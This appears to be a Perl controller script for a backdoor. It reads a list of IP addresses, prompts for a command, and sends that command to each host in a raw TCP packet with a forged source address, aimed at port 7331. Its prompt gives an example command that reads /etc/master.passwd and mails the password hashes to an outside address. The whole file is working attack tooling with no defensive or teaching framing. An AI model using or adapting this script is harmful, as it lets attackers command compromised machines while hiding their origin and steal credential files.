#!/usr/bin/perl

die "usage: $0 <file with ip list>\n" unless @ARGV == 1;
use pdump::Sniff;
open (X, $ARGV[0]) or die "Can't open $ARGV[0]: $!\n";
print "Enter the command you want run, example: cat /etc/master.passwd|mail user\@domain\n> ";
chomp ($com = <STDIN>);
while (<X>) {
 chomp ($x = $_);
 $a = new pdump::Sniff;
 $a->set({
  ip  => { ttl => 52,
           tos => 0,
           frag_off => 0,
           saddr => "123.123.123.123",
           daddr => $x },
  tcp => { dest => 7331,
           source => 123123,
           seq => 234234234,
           ack_seq => 3242324,
           ack => 1,
           psh => 1,
           window => 17520,
           data => "${com}X\n" }
 });
 $a->send;
}
